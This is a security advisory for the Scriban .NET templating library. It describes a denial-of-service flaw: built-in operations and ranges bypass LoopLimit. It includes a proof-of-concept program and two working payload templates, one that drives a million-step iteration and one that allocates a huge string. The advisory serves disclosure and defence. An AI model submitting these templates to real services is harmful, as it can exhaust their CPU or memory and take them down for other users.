# [H] Scriban: Built-in operations bypass LoopLimit and delay cancellation, enabling Denial of Service

## Summary
Severity: High
Advisory: GHSA-c875-h985-hvrc
CWE: CWE-400
Ecosystem: NuGet
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-24
Source: https://github.com/advisories/GHSA-c875-h985-hvrc
Type: github-advisory

## Affected
- NuGet: `scriban` — affected >=0 <7.0.0
- NuGet: `Scriban.Signed` — affected >=0 <7.0.0

## Details
## Summary

Scriban's `LoopLimit` only applies to script loop statements, not to expensive iteration performed inside operators and builtins. An attacker can submit a single expression such as `{{ 1..1000000 | array.size }}` and force large amounts of CPU work even when `LoopLimit` is set to a very small value.

## Details

The relevant code path is:

- `ScriptBlockStatement.Evaluate()` calls `context.CheckAbort()` once per statement in `src/Scriban/Syntax/Statements/ScriptBlockStatement.cs` lines 41–46.
- `LoopLimit` enforcement is tied to script loop execution via `TemplateContext.StepLoop()`, not to internal helper iteration.
- `array.size` in `src/Scriban/Functions/ArrayFunctions.cs` lines 596–609 calls `list.Cast<object>().Count()` for non-collection enumerables.
- `1..N` creates a `ScriptRange` from `ScriptBinaryExpression.RangeInclude()` in `src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs` lines 745–748.
- `ScriptRange` then yields every element one by one **without going through `StepLoop()`** in `src/Scriban/Runtime/ScriptRange.cs`.

This means a single statement can perform arbitrarily large iteration without being stopped by `LoopLimit`.

There is also a related memory-amplification path in `string * int`:

- `ScriptBinaryExpression.CalculateToString()` appends in a plain `for` loop in `src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs` lines 301–334.

---

## Proof of Concept

### Setup

```bash
mkdir scriban-poc3
cd scriban-poc3
dotnet new console --framework net8.0
dotnet add package Scriban --version 6.6.0
```

### `Program.cs`

```csharp
using Scriban;

var template = Template.Parse("{{ 1..1000000 | array.size }}");

var context = new TemplateContext
{
    LoopLimit = 1
};

Console.WriteLine(template.Render(context));
```

### Run

```bash
dotnet run
```

### Actual Output

```
1000000
```

### Expected Behavior

A safety limit of `LoopLimit = 1` should prevent a template from performing one million iterations worth of work.

### Optional Stronger Variant (Memory Amplification)

```csharp
using Scriban;

var template = Template.Parse("{{ 'A' * 200000000 }}");
var context = new TemplateContext
{
    LoopLimit = 1
};

template.Render(context);
```

This variant demonstrates that `LoopLimit` also does not constrain large internal allocation work.

---

## Impact

This is an uncontrolled resource consumption issue. Any application that accepts attacker-controlled templates and relies on `LoopLimit` as part of its safe-runtime configuration can still be forced into heavy CPU or memory work by a single expression.

The issue impacts:

- Template-as-a-service systems
- CMS or email rendering systems that accept user templates
- Any multi-tenant use of Scriban with untrusted template content

## References
- https://github.com/scriban/scriban/security/advisories/GHSA-c875-h985-hvrc
- https://github.com/scriban/scriban
